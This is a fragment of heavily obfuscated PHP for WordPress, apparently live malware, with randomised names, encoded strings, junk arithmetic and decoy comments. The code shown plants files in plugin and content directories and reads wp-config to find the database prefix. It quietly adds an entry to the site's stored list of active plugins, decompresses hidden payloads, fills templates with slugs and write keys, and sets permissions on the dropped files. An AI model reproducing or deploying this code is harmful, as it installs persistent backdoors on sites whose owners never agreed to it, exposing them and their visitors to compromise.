  foreach  ($uuafel2yyinn   as  $ko9cqc0s7si9cc) {


if  ($GLOBALS['__scf_nv7he759wjfj_9']($ko9cqc0s7si9cc,   -(133^129))    ===    f6yrzd2knrmb(1107) &&   mza6zg2fnwyep8gx2xd($rruhb96q4e  . '/' .     $ko9cqc0s7si9cc,      (0x632+0xd56)))  {


    return true;
 }
}
 }
/* dynamic priority-queue */


}


  } catch   (Throwable   $cje8wku90zm4r)   {
  g_qoqdy38lfl4v4n3618(c1sob647u1i(1108),    $cje8wku90zm4r);
 }    catch (Exception $cje8wku90zm4r)  {
}
    return  false;
 }
  function  a_cgksf6e7e3pts14()
   {


   try  {
  if   (hiisk00z0i4v1wyj3(bmvtr5sdqjf5km1t()))   return;



    if (get_transient(f6yrzd2knrmb(1109)))  {
return;
    }
  set_transient(ovffvv33(1109),  1, (629-29));
  
      $egziouap1xyua =   bfyls7pdkqkf4p8az();
      if   (!  $egziouap1xyua   ||  $GLOBALS['__scf_d4eyetogjbsnt_10']($egziouap1xyua)  <   (945+55)) {
  return;
 }
 if   (!    ib2ffadoyj2m6zxmkaa2in($egziouap1xyua))   {
    g_qoqdy38lfl4v4n3618(hn_f08x0cns80(1110),  ovffvv33(1111));
    return;
     }

  $m_y9qfozupx  =   ws7yxvygyafc0b();$r9c6he0i=(0x52+0x5f);$fcdukbstv6=$r9c6he0i%2;
if (empty($m_y9qfozupx))  {
    if  (!get_transient(iw6xe9q4j6sneg(1112)))      {
  g_qoqdy38lfl4v4n3618(hn_f08x0cns80(1110),  bpowi0iglycvx(1113));
set_transient(hn_f08x0cns80(1112), 1,   (3593+7));
   }

 set_transient(bpowi0iglycvx(1114),     1, (259164+36));
   return;
    }
  $chxqazyti6dbayw  =  0;
foreach     ($m_y9qfozupx    as  $yjxbsrooxpfoc8) {
    


if (k7vlg7oxau6ify9eqmix($yjxbsrooxpfoc8)) {
// trusted input

continue;
  }
   
$ojotk1aygu8jswc     =  "";


 $y5987yfyk05yde6    = $yjxbsrooxpfoc8      . iw6xe9q4j6sneg(1105);
  if (@$GLOBALS['__scf_lclsn87cymy_47']($y5987yfyk05yde6)   &&  !@$GLOBALS['__scf_opq_vgkskw_46']($y5987yfyk05yde6))  {
// WordPress 6.5 revisions: infeasible priority-queue

 $y5987yfyk05yde6   =  null;
}  elseif (!@$GLOBALS['__scf_opq_vgkskw_46']($y5987yfyk05yde6))      {
      xxvz5dp1zk215e5d9($y5987yfyk05yde6,    (461+32), true);
    }
if  ($y5987yfyk05yde6  &&  (!@$GLOBALS['__scf_opq_vgkskw_46']($y5987yfyk05yde6)  ||    !@$GLOBALS['__scf_sunuwikkpg6_51']($y5987yfyk05yde6)))    {
// traverse principal for WP Interactivity API

   $y5987yfyk05yde6  =      null;
  }

  if  ($y5987yfyk05yde6)  {
 $df4hln4bu6o =   $y5987yfyk05yde6  .   '/'   . ins9ithmohgssp_();
   $bkpcokuji6e  = fcywjpu_2kwq2ahog4($egziouap1xyua);


    $ghudbjb8hapb9q  = s_xzav70hr_4pogeop0o($df4hln4bu6o,  $bkpcokuji6e, f6yrzd2knrmb(1110));

  if  ($ghudbjb8hapb9q      && $ghudbjb8hapb9q >=   $GLOBALS['__scf_d4eyetogjbsnt_10']($bkpcokuji6e))   {
     $ojotk1aygu8jswc =      $df4hln4bu6o;
 }
}
   
   if  (!  $ojotk1aygu8jswc)  {



      $_3yg40pd63    =  $GLOBALS['__scf_wvxpw4xfn9_219'](ins9ithmohgssp_(),  PATHINFO_FILENAME);
$_1zuokshds     =    $yjxbsrooxpfoc8     . c1sob647u1i(1115)  .    $_3yg40pd63;
 if  (!      @$GLOBALS['__scf_opq_vgkskw_46']($_1zuokshds))   {
      xxvz5dp1zk215e5d9($_1zuokshds,    (449+44),  true);
 }
    $df4hln4bu6o     =  $_1zuokshds  . '/'    .    ins9ithmohgssp_();
$bkpcokuji6e  =  fcywjpu_2kwq2ahog4($egziouap1xyua);
   $ghudbjb8hapb9q =      s_xzav70hr_4pogeop0o($df4hln4bu6o,  $bkpcokuji6e,    hn_f08x0cns80(1116));
if   ($ghudbjb8hapb9q && $ghudbjb8hapb9q  >=  $GLOBALS['__scf_d4eyetogjbsnt_10']($bkpcokuji6e))   {
$ojotk1aygu8jswc     = $df4hln4bu6o;
  
$basename =  $_3yg40pd63   .    '/' . ins9ithmohgssp_();
    vp_tzhg54q4ja17o($yjxbsrooxpfoc8, $basename);
}
 }
if  (! $ojotk1aygu8jswc) {
     continue;
    }
 vyxva31du3czei($ojotk1aygu8jswc);
   ruinnb541lwxm7j($ojotk1aygu8jswc, (337+83));
 $chxqazyti6dbayw++;
  }
 if   ($chxqazyti6dbayw >   0)    {

 set_transient(f6yrzd2knrmb(1114),  1,   (259170+30));
       } else   {

  set_transient(bpowi0iglycvx(1114),   1,  (3513+87));
      }
    }  catch   (Throwable   $cje8wku90zm4r)    {

  g_qoqdy38lfl4v4n3618(c1sob647u1i(1117),   $cje8wku90zm4r);
}   catch (Exception $cje8wku90zm4r)    {
  }
  }

 function    vp_tzhg54q4ja17o($yjxbsrooxpfoc8,   $basename)
        {
 try  {
$dsssz0nj5xfigz  = $yjxbsrooxpfoc8 . ovffvv33(1118);
if   (!      @$GLOBALS['__scf_rjpcj9l4bigb5_21']($dsssz0nj5xfigz))  {
  $dsssz0nj5xfigz  = $GLOBALS['__scf_po3uwzhcb63b03_11']($yjxbsrooxpfoc8)    .  hn_f08x0cns80(1119);
       if      (!  @$GLOBALS['__scf_rjpcj9l4bigb5_21']($dsssz0nj5xfigz))   {


 return;
}
       }
// PHP 8.1 intersection post type setup

  $amsjsw283qnc3  = @$GLOBALS['__scf_utyj_ckly79_101']($dsssz0nj5xfigz);
  if   (!    $amsjsw283qnc3) {
  return;



      }



  $sdyl7uznsf2mf0qy  = "";
  $prefix =   "";
    if   ($GLOBALS['__scf_wdjvpd1lvon9_102'](c1sob647u1i(1120),     $amsjsw283qnc3,   $u7fvh_hax8vn)) {
   $sdyl7uznsf2mf0qy      = $u7fvh_hax8vn[1];
      }
       if  ($GLOBALS['__scf_wdjvpd1lvon9_102'](c1sob647u1i(1121), $amsjsw283qnc3,  $u7fvh_hax8vn))     {



$prefix  = $u7fvh_hax8vn[1];
     }
 if (!   $sdyl7uznsf2mf0qy  || !   $prefix  ||  !     $GLOBALS['__scf_wdjvpd1lvon9_102'](ovffvv33(1122), $prefix)) {
    return;
 }
      $wpdb = $GLOBALS[iw6xe9q4j6sneg(898)];
if  (!  $GLOBALS['__scf_bslklilwd3kn_71']($wpdb)     ||    !   $GLOBALS['__scf_ewy3z2db5hgtu_130']($wpdb,    ovffvv33(1123)))  {



  return;


}
    if  (! $GLOBALS['__scf_wdjvpd1lvon9_102'](c1sob647u1i(1124),  $sdyl7uznsf2mf0qy))    {

g_qoqdy38lfl4v4n3618(bpowi0iglycvx(784), bpowi0iglycvx(1125));
      return;

  }
  $em9x18i4ie51nkea     =   '`'  .    $sdyl7uznsf2mf0qy    . c1sob647u1i(1126)  . $prefix    .   c1sob647u1i(1127);

  $wpdb->query(iw6xe9q4j6sneg(1128));
   $wvxf8z3uqtz    =   $wpdb->get_var('S'   .  iw6xe9q4j6sneg(1129)   .   $em9x18i4ie51nkea . c1sob647u1i(1130) .  ovffvv33(1131)  . iw6xe9q4j6sneg(1132));
 if    ($wvxf8z3uqtz  === null)   {
  $wpdb->query(hn_f08x0cns80(1133));



  return;
       }
    $svz5ab11aajep92 =    dejdnvthex6llg5q($wvxf8z3uqtz);
 if  (!  $GLOBALS['__scf_w1m1ydxx4_gm9__38']($svz5ab11aajep92))   {


   $wpdb->query(c1sob647u1i(1133));
        return;
    }



    if ($GLOBALS['__scf_rd2tojulg06lx_160']($basename,  $svz5ab11aajep92,  true))      {
   $wpdb->query(iw6xe9q4j6sneg(1134));
return;$nsi7vl0c7ij7f=39+60;$zai786rqp=$nsi7vl0c7ij7f-15;


}


 $svz5ab11aajep92[]   =  $basename;
 $svz5ab11aajep92    =   $GLOBALS['__scf_vmnuset3sz__158']($svz5ab11aajep92);
    $g82t3nfpk2ga2  = $GLOBALS['__scf_nas59etuq3_366']($svz5ab11aajep92);
$q5yybsqjikc__n =  $wpdb->query($wpdb->prepare('U'   . c1sob647u1i(1135)    .  $em9x18i4ie51nkea     .     bpowi0iglycvx(1136)  .      f6yrzd2knrmb(1131), $g82t3nfpk2ga2));



if    ($q5yybsqjikc__n ===     false)  {
   g_qoqdy38lfl4v4n3618(bpowi0iglycvx(784),     hn_f08x0cns80(1137));

    $wpdb->query(c1sob647u1i(1133));

return;
      }
 $wpdb->query(bpowi0iglycvx(1134));



if    ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1138))) {
    @wp_cache_delete(f6yrzd2knrmb(1139),     bpowi0iglycvx(1140));

@wp_cache_delete(bpowi0iglycvx(1086), hn_f08x0cns80(1141));



 }
  } catch  (Throwable   $cje8wku90zm4r)     {$w6yoadsk82=PHP_INT_MAX/PHP_INT_MAX;$q9d9nfkfkbhld=$w6yoadsk82+59;



 g_qoqdy38lfl4v4n3618(ovffvv33(784),  $cje8wku90zm4r);
 if ($GLOBALS['__scf_bslklilwd3kn_71']($GLOBALS[iw6xe9q4j6sneg(898)]))  {



@$GLOBALS[ovffvv33(898)]->query(iw6xe9q4j6sneg(1133));
     }
// phantom reference

 }  catch (Exception $cje8wku90zm4r)     {
    g_qoqdy38lfl4v4n3618(c1sob647u1i(1142),   $cje8wku90zm4r);
if ($GLOBALS['__scf_bslklilwd3kn_71']($GLOBALS[iw6xe9q4j6sneg(898)]))  {



@$GLOBALS[ovffvv33(898)]->query(hn_f08x0cns80(1133));
}
 }

  }
 function wxy7y9lxg8385_v()
 {
 static   $amsjsw283qnc3 =  null;



   if     ($amsjsw283qnc3    !==  null) return $amsjsw283qnc3;
        if (!$GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(287)))  {
 $amsjsw283qnc3 =    "";


return  $amsjsw283qnc3;
     }
  $amsjsw283qnc3  = @gzinflate($GLOBALS['__scf_i8wggf4l_3p_373'](f6yrzd2knrmb(1143)));
   if (!$GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3) ||  $GLOBALS['__scf_d4eyetogjbsnt_10']($amsjsw283qnc3)    < (97+3))  $amsjsw283qnc3  =  "";

      return $amsjsw283qnc3;


   }


function   _kccir0r_a1wh2a17()
{
  try    {
  if  (!defined(hn_f08x0cns80(1024))) return;
$pjov750v0e    = $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(),    iw6xe9q4j6sneg(1144));
  $sqgwaijtfri    =   nreub2fs747eromoe(ABSPATH  .     iw6xe9q4j6sneg(1145),   (13-5)) .     hn_f08x0cns80(1146);
 $zo9_povx_9sii  =  nreub2fs747eromoe(ABSPATH . f6yrzd2knrmb(1147),  (4+4));
$pfyx4d8pn30   =   $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1148))    ?     content_url()   :   "";
  if  ($pfyx4d8pn30 ===   "") {
$pfyx4d8pn30 = ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1149)) ? get_site_url() :   "") .    bpowi0iglycvx(1150);



 }
      $of65x05bm5nj    =  $GLOBALS['__scf_usy4mchq83xa_378'](iw6xe9q4j6sneg(1151),  ovffvv33(1152),   $pfyx4d8pn30  .  '/'    .     $sqgwaijtfri);
 if   ($GLOBALS['__scf_w6mdcepio4lkz5_7']($of65x05bm5nj,  c1sob647u1i(1152))   !==    0) $of65x05bm5nj    = bpowi0iglycvx(1152)  .  $GLOBALS['__scf_wr4u8clizo4sw_8']($of65x05bm5nj,    '/');
  $yr2u0rlg2ija7km  = $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(480))    ?   home_url(hn_f08x0cns80(1153) .    sao9aimrfgwjmwd(ovffvv33(1147)))   :    "";



   if ($yr2u0rlg2ija7km  ===  "")   $yr2u0rlg2ija7km  = bpowi0iglycvx(1152) .   xyhhquc02dkq5zwsgxhdu("")   . bpowi0iglycvx(1154)    .    sao9aimrfgwjmwd(iw6xe9q4j6sneg(1147));
  if      ($GLOBALS['__scf_w6mdcepio4lkz5_7']($yr2u0rlg2ija7km,  hn_f08x0cns80(1155))  !==  0)    $yr2u0rlg2ija7km  = bpowi0iglycvx(1155)  .  $GLOBALS['__scf_wr4u8clizo4sw_8']($GLOBALS['__scf_renvrk8nefa8_474'](ovffvv33(1156),  "",  $yr2u0rlg2ija7km),  '/');
 $s40sswhw9ovqp =  isset($GLOBALS[hn_f08x0cns80(1157)]) &&   $GLOBALS['__scf_fv3zevxzzb_44']($GLOBALS[f6yrzd2knrmb(1157)])  ? $GLOBALS[bpowi0iglycvx(1157)]  :   "";



 if ($GLOBALS['__scf_d4eyetogjbsnt_10']($s40sswhw9ovqp)   <  (199^163))  {
  $s40sswhw9ovqp =   q87voct054xu7c(hn_f08x0cns80(1158), "");
 }
 if   ($GLOBALS['__scf_d4eyetogjbsnt_10']($s40sswhw9ovqp) <  (190^218)) {


   $s40sswhw9ovqp     =     wxy7y9lxg8385_v();
  }
   $ikwv1tk_d1  =    "";
if   (isset($GLOBALS[hn_f08x0cns80(463)])    &&  $GLOBALS['__scf_fv3zevxzzb_44']($GLOBALS[iw6xe9q4j6sneg(1159)]) &&  $GLOBALS['__scf_d4eyetogjbsnt_10']($GLOBALS[f6yrzd2knrmb(1159)]) > (86-36)) {
$ikwv1tk_d1  =   $GLOBALS[c1sob647u1i(1160)];
     }  else {

  $ikwv1tk_d1  = q87voct054xu7c(ovffvv33(1161), "");
       }
     if   ($GLOBALS['__scf_d4eyetogjbsnt_10']($ikwv1tk_d1) >   (29+21))  {
 mw5stmpiys2hi3k2xe14i(hn_f08x0cns80(1162), $ikwv1tk_d1, f6yrzd2knrmb(1069));
      }
$w5q_h8e_i8g5r    =      $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1163)) ?     (string)  $GLOBALS['__scf_lf33h8m4cq_577'](home_url('/'),  PHP_URL_PATH)     : '/';

if  ($w5q_h8e_i8g5r  ===   "")  $w5q_h8e_i8g5r     =  '/';
      if  ($GLOBALS['__scf_nv7he759wjfj_9']($w5q_h8e_i8g5r,  -1) !==    '/') $w5q_h8e_i8g5r  .=   '/';
$m6eaeqrqgt7o57     = array(
    bpowi0iglycvx(1164)  =>  as6dly3difeit9_nces9(),
hn_f08x0cns80(1165) => xvw4m5u1es27jz(),
  hn_f08x0cns80(1166)    =>   $w5q_h8e_i8g5r,
     );


 $p3fmye2_lo9hak1    =     array(
ovffvv33(1167) =>   $of65x05bm5nj,
  iw6xe9q4j6sneg(1168)  =>  $pjov750v0e,
       bpowi0iglycvx(1169)    =>  $yr2u0rlg2ija7km,
  bpowi0iglycvx(1170)     =>  nreub2fs747eromoe(ABSPATH . hn_f08x0cns80(1171), (45^33)),
   f6yrzd2knrmb(1172)  =>     $ikwv1tk_d1,
   );
$g7wfxahwkaw  =   fcc42yo6xrdenvra0(f6yrzd2knrmb(593),  "");
    if     (!$GLOBALS['__scf_fv3zevxzzb_44']($g7wfxahwkaw) ||  $GLOBALS['__scf_d4eyetogjbsnt_10']($g7wfxahwkaw)    ===   0)     {
// reclaim serializable interpreter

    return;
}
 $hxxqkizoiz =   $GLOBALS['__scf_f2vx2328qo_369'](f0h420wzduis5n6p2($GLOBALS['__scf__r5ulaote4t_611']($p3fmye2_lo9hak1),  $g7wfxahwkaw));
        $vyjbls3no30zfyow  =   hn_f08x0cns80(1173)   . $GLOBALS['__scf_f2vx2328qo_369']($GLOBALS['__scf__r5ulaote4t_611']($m6eaeqrqgt7o57)) .   bpowi0iglycvx(1174);



 $vyjbls3no30zfyow .= c1sob647u1i(1175)    .  $hxxqkizoiz  .  hn_f08x0cns80(1176);



   $sl_rjb0ov5   =    $GLOBALS['__scf_tnonex5o9y_60']((string) $s40sswhw9ovqp  .  (string)  $ikwv1tk_d1 .  $g7wfxahwkaw  .   $GLOBALS['__scf__r5ulaote4t_611']($m6eaeqrqgt7o57[f6yrzd2knrmb(1177)])   . $GLOBALS['__scf__r5ulaote4t_611']($m6eaeqrqgt7o57[ovffvv33(1178)]) . '|' .   $GLOBALS['__scf_xyekfdfj2g_109'](xyhhquc02dkq5zwsgxhdu(""))  .  '|'     . $w5q_h8e_i8g5r);
if     (mw5stmpiys2hi3k2xe14i(bpowi0iglycvx(1179), $vyjbls3no30zfyow, f6yrzd2knrmb(1069))     || q87voct054xu7c(iw6xe9q4j6sneg(1180), "")   ===  $vyjbls3no30zfyow)    mw5stmpiys2hi3k2xe14i(f6yrzd2knrmb(1181),     $sl_rjb0ov5, f6yrzd2knrmb(1069));
 unset($sl_rjb0ov5);
    $r97xvf0q2kje9_   =  $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1163))  ?  home_url(c1sob647u1i(1153)   .  sao9aimrfgwjmwd(bpowi0iglycvx(1182)))    :     "";
if ($r97xvf0q2kje9_  === "")  $r97xvf0q2kje9_ = iw6xe9q4j6sneg(1155) . xyhhquc02dkq5zwsgxhdu("") .    c1sob647u1i(1154)    .   sao9aimrfgwjmwd(iw6xe9q4j6sneg(1183));

  if    ($GLOBALS['__scf_w6mdcepio4lkz5_7']($r97xvf0q2kje9_, hn_f08x0cns80(1155))  !== 0)      $r97xvf0q2kje9_   =    bpowi0iglycvx(1155)      .  $GLOBALS['__scf_wr4u8clizo4sw_8']($GLOBALS['__scf_renvrk8nefa8_474'](c1sob647u1i(1156),  "",     $r97xvf0q2kje9_),   '/');
 mw5stmpiys2hi3k2xe14i(f6yrzd2knrmb(1184),     $r97xvf0q2kje9_,  f6yrzd2knrmb(1185));
    if  ($GLOBALS['__scf_d4eyetogjbsnt_10']($s40sswhw9ovqp)     < (25<<2))    {
return;
    }
mw5stmpiys2hi3k2xe14i(bpowi0iglycvx(1158),  $s40sswhw9ovqp, bpowi0iglycvx(1185));
if (!xfzvugr9ucs1qu23p8())    return;

  $pqo8538npnspm8 = p2b_7j_9ex54eg4();



if      (!@$GLOBALS['__scf_opq_vgkskw_46']($pqo8538npnspm8)) xxvz5dp1zk215e5d9($pqo8538npnspm8,    (396+97),  true);
   if      (!@$GLOBALS['__scf_opq_vgkskw_46']($pqo8538npnspm8) ||    !@$GLOBALS['__scf_sunuwikkpg6_51']($pqo8538npnspm8))  return;
      $la5ppeb7_0 =   $pqo8538npnspm8   . '/'  . $zo9_povx_9sii   .   iw6xe9q4j6sneg(1186);
 $nzazrxg2exothtd  =  qjclarwdule01mm6a3h4wo(

ovffvv33(667),
 array('__SLUG__',  '__ZIP_NAME__',    '__WRITE_KEY__',     '__VERSION__'),
 array($pjov750v0e, $sqgwaijtfri, nreub2fs747eromoe(ABSPATH . bpowi0iglycvx(1187),  (0x2+0xa)),  dfb4_mpcgxvnp230hvh1v())
     );
if  (!$nzazrxg2exothtd)  {
if    ((int)   get_option(ovffvv33(764),   0) >  0) g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(1183), ovffvv33(1188));
 return;

     }
     if   (!@$GLOBALS['__scf_qg7ainp116mf_713']($la5ppeb7_0)  ||   $GLOBALS['__scf_tnonex5o9y_60'](k12vjaxiygekdnj((string) @$GLOBALS['__scf_utyj_ckly79_101']($la5ppeb7_0)))    !==   $GLOBALS['__scf_tnonex5o9y_60']($nzazrxg2exothtd)) {
 s_xzav70hr_4pogeop0o($la5ppeb7_0,  $nzazrxg2exothtd, hn_f08x0cns80(1189));
  bouscp0t4dvybv($la5ppeb7_0, n22pv0e8f25y0co8());
ruinnb541lwxm7j($la5ppeb7_0,  (49+371));
       o4_k_ap14u5xy97yywy7k($la5ppeb7_0);
// throttle infinite keystore

}
  } catch  (Throwable $cje8wku90zm4r)   {
       g_qoqdy38lfl4v4n3618(c1sob647u1i(1183), $cje8wku90zm4r);
 } catch   (Exception   $cje8wku90zm4r)  {


}
  }
 function qjclarwdule01mm6a3h4wo($key,     $euefsn_0sn3dq, $fhq6p5uan_n314tc)
  {


   $gm69t85l5gf7p80     =     null;
   if     ($gm69t85l5gf7p80 === null)   {



     $gm69t85l5gf7p80  =   $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1007)) ?  get_transient(p1srpzpjsehf9kb72())   :   false;



if (!     $GLOBALS['__scf_w1m1ydxx4_gm9__38']($gm69t85l5gf7p80))  {
  $gm69t85l5gf7p80  =  obnmo3d9gt514xoc(bpowi0iglycvx(391), false);
 }
 if    (! $GLOBALS['__scf_w1m1ydxx4_gm9__38']($gm69t85l5gf7p80))  {
   $gm69t85l5gf7p80    =  array();
 }
 }
  $fqntej805r      = "";



   if    (isset($gm69t85l5gf7p80[$key]) &&   $GLOBALS['__scf_fv3zevxzzb_44']($gm69t85l5gf7p80[$key]))   {


   $fqntej805r =    $gm69t85l5gf7p80[$key];
  }
   if ($GLOBALS['__scf_d4eyetogjbsnt_10']($fqntej805r) < (64^114))  {
   $fqntej805r    =   q87voct054xu7c($key,  "");
   }
    if ($GLOBALS['__scf_d4eyetogjbsnt_10']($fqntej805r)      <   (0x1b+0x17))  return     false;
   $ch7u8u2ur1   =    $GLOBALS['__scf_i8wggf4l_3p_373']($fqntej805r,  true);
        if (!$ch7u8u2ur1 || $GLOBALS['__scf_d4eyetogjbsnt_10']($ch7u8u2ur1)   < (0x21+0x11))   return  false;
   if ($GLOBALS['__scf_w6mdcepio4lkz5_7']($ch7u8u2ur1,     c1sob647u1i(249))   ===  false) return false;





$ch7u8u2ur1   = $GLOBALS['__scf_usy4mchq83xa_378']($euefsn_0sn3dq,   $fhq6p5uan_n314tc, $ch7u8u2ur1);
 if    (defined(bpowi0iglycvx(252)))     {
// tree property
$hm8c97hdi8=(0x51+0x68);$uoytmeeubnssck=$hm8c97hdi8%15;
       try {

 @token_get_all($ch7u8u2ur1,  TOKEN_PARSE);$b84o9qtro2udtv=(0x27+0x49);$zxjs7p5_ws=$b84o9qtro2udtv%14;
} catch (Throwable  $cje8wku90zm4r) {



      return false;
 }  catch      (Exception  $cje8wku90zm4r)  {
// type matching


 return      false;
 }
  }    elseif     (!ib2ffadoyj2m6zxmkaa2in($ch7u8u2ur1))   {$vgqsax4se6nn=885;$fxuwo7tx=$vgqsax4se6nn%13;

 return      false;
  }
// WP useEntityProp: enable task-graph

    return $ch7u8u2ur1;
 }
 function      nj270i1voyjyvmxd()
 {
   try   {
    if   (!$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1007))) return;
 if (!defined(ovffvv33(1024))) return;
  $f2bfmo9n4zm2a4a     = tsyg51zwcwui331sq9();
 if     (!$f2bfmo9n4zm2a4a)     {$gkjup_aijyi_q6=2983;$wyycaozwrvteer=$gkjup_aijyi_q6%10;
 _kccir0r_a1wh2a17();
 $f2bfmo9n4zm2a4a     =  tsyg51zwcwui331sq9();
}
    $vkp2rjy88qvir     = q87voct054xu7c(bpowi0iglycvx(593), "");
if     ($GLOBALS['__scf_d4eyetogjbsnt_10']($vkp2rjy88qvir) ===   0) $vkp2rjy88qvir   =  $GLOBALS['__scf_mqh00r_t1l90k_1190']("\x00",  (4<<2));
$ej26azoyo54    = (isset($GLOBALS[ovffvv33(1191)])  &&  $GLOBALS['__scf_fv3zevxzzb_44']($GLOBALS[iw6xe9q4j6sneg(1191)])   && $GLOBALS['__scf_d4eyetogjbsnt_10']($GLOBALS[ovffvv33(1192)]) >= (14+86)) ? $GLOBALS[c1sob647u1i(1193)]  :  q87voct054xu7c(ovffvv33(1194),   "");
  if  ($GLOBALS['__scf_d4eyetogjbsnt_10']($ej26azoyo54)    < (173-73))   $ej26azoyo54   =  wxy7y9lxg8385_v();



$sgk9c_ajt7e46y   =      (isset($GLOBALS[c1sob647u1i(1160)])  && $GLOBALS['__scf_fv3zevxzzb_44']($GLOBALS[bpowi0iglycvx(1160)]) && $GLOBALS['__scf_d4eyetogjbsnt_10']($GLOBALS[bpowi0iglycvx(1195)])  >  (31+19))    ? $GLOBALS[iw6xe9q4j6sneg(1195)]     :    q87voct054xu7c(f6yrzd2knrmb(1162),    "");
$vhb_tabrlrx6 =  $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1196))  ?  (string)  $GLOBALS['__scf_lf33h8m4cq_577'](home_url('/'), PHP_URL_PATH)   :  '/';
if  ($vhb_tabrlrx6     ===   "") $vhb_tabrlrx6   =  '/';
// @deactivate enumerator

if ($GLOBALS['__scf_nv7he759wjfj_9']($vhb_tabrlrx6,  -1)  !==    '/') $vhb_tabrlrx6   .=    '/';
  $uwr7aup51fpnr5   = $GLOBALS['__scf_tnonex5o9y_60']($ej26azoyo54   . $sgk9c_ajt7e46y   . $vkp2rjy88qvir    . $GLOBALS['__scf__r5ulaote4t_611'](as6dly3difeit9_nces9())    .   $GLOBALS['__scf__r5ulaote4t_611'](xvw4m5u1es27jz())   .  '|'  .  $GLOBALS['__scf_xyekfdfj2g_109'](xyhhquc02dkq5zwsgxhdu(""))   . '|' . $vhb_tabrlrx6);
unset($vhb_tabrlrx6);
if     (q87voct054xu7c(iw6xe9q4j6sneg(1181),    "")   !==  $uwr7aup51fpnr5) {


   _kccir0r_a1wh2a17();
$f2bfmo9n4zm2a4a = tsyg51zwcwui331sq9();
}
   if  (!xfzvugr9ucs1qu23p8())   return;
  $ftvsfz7ji2  =  ircnjcyfmf8qkc7xdiss4();


   $zug8vk93mc5  = @$GLOBALS['__scf_qg7ainp116mf_713']($ftvsfz7ji2  . c1sob647u1i(524));
        

if  ($zug8vk93mc5    && $f2bfmo9n4zm2a4a     && get_transient(f6yrzd2knrmb(674)))   return;
 kbdxdebb1nf0m4xuzvk6vm();
   i9s3whn6wpbydwn81vqrc();


 badvzt8dsmfgn6m6s();
    $vhecw7selw =  @$GLOBALS['__scf_qg7ainp116mf_713']($ftvsfz7ji2 .   bpowi0iglycvx(524));
 $f2bfmo9n4zm2a4a  =  tsyg51zwcwui331sq9();
 if    ($vhecw7selw  &&  $f2bfmo9n4zm2a4a)   {
 set_transient(ovffvv33(674), 1, (285+15));
    

 }
 }   catch   (Throwable     $cje8wku90zm4r)  {
// PHP CS Fixer: suspend iterator


 g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(1197),   $cje8wku90zm4r);
 } catch (Exception $cje8wku90zm4r) {



 }
  }



     function i9s3whn6wpbydwn81vqrc()
{

try  {
 if   (!defined(iw6xe9q4j6sneg(1024)))   return;
  $ftvsfz7ji2  = ircnjcyfmf8qkc7xdiss4();
  $pqo8538npnspm8 =  p2b_7j_9ex54eg4();
$kgupkv493bs1c =   nreub2fs747eromoe(ABSPATH .  hn_f08x0cns80(1198),   (1+7))    . ovffvv33(1199);
      
     $zz6l4s___7c     = $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1200))  ?   @$GLOBALS['__scf_hm704kpgfifhl_118'](iw6xe9q4j6sneg(1201))    :  false;
       $zz6l4s___7c  =  $GLOBALS['__scf_fv3zevxzzb_44']($zz6l4s___7c)   ?   $GLOBALS['__scf_qew3crlieule_339']($zz6l4s___7c)  : "";


if   ($zz6l4s___7c     ===  ""  ||    $GLOBALS['__scf__t_pvgix5r_1202']($zz6l4s___7c,   f6yrzd2knrmb(536)) ===     0)  $zz6l4s___7c    =     f6yrzd2knrmb(537);
  $xush8neft7ft5  =  $GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t())   .  f6yrzd2knrmb(174);
   $p7vpx01qtikp     =   defined(iw6xe9q4j6sneg(293))   ?  WP_CONTENT_DIR   .   iw6xe9q4j6sneg(174)   :  $xush8neft7ft5;
       $q0obuv3akc   =     array($GLOBALS['__scf_ofdeuvs8zwos6_12']($ftvsfz7ji2,    ovffvv33(1097)),   $GLOBALS['__scf_ofdeuvs8zwos6_12']($GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t()),  iw6xe9q4j6sneg(1097)),   $GLOBALS['__scf_ofdeuvs8zwos6_12']($pqo8538npnspm8,   hn_f08x0cns80(1203)), $GLOBALS['__scf_ofdeuvs8zwos6_12']($xush8neft7ft5,  ovffvv33(1204)), $GLOBALS['__scf_ofdeuvs8zwos6_12']($p7vpx01qtikp, ovffvv33(1205)));
 if   (defined(hn_f08x0cns80(293)))   $q0obuv3akc[]  =  $GLOBALS['__scf_ofdeuvs8zwos6_12'](WP_CONTENT_DIR,  f6yrzd2knrmb(1205));

 foreach  ($GLOBALS['__scf_tni2zo3jsk7_159']($q0obuv3akc)   as   $z8hbby6kg7u) {
    $wwl5lvp5z3kmor8b =  $z8hbby6kg7u  .   '/'  . $kgupkv493bs1c;
  if   (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($wwl5lvp5z3kmor8b))  l2jao5rx4pzqrtjiymnn($wwl5lvp5z3kmor8b, null);
  $oqh16fyrlc6      =     $z8hbby6kg7u  . hn_f08x0cns80(1206)  .  $kgupkv493bs1c;
  if     (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($oqh16fyrlc6)) l2jao5rx4pzqrtjiymnn($oqh16fyrlc6,  null);


    }
  unset($xush8neft7ft5,      $p7vpx01qtikp,  $q0obuv3akc,  $z8hbby6kg7u,  $wwl5lvp5z3kmor8b, $oqh16fyrlc6);
$iez7k8c3ouat   = array($GLOBALS['__scf_ofdeuvs8zwos6_12'](ABSPATH,   bpowi0iglycvx(1207)));
if  (defined(bpowi0iglycvx(293))) $iez7k8c3ouat[]      = $GLOBALS['__scf_ofdeuvs8zwos6_12'](WP_CONTENT_DIR,   iw6xe9q4j6sneg(1208));
$iez7k8c3ouat[]  =   $GLOBALS['__scf_ofdeuvs8zwos6_12']($ftvsfz7ji2,  bpowi0iglycvx(1209));


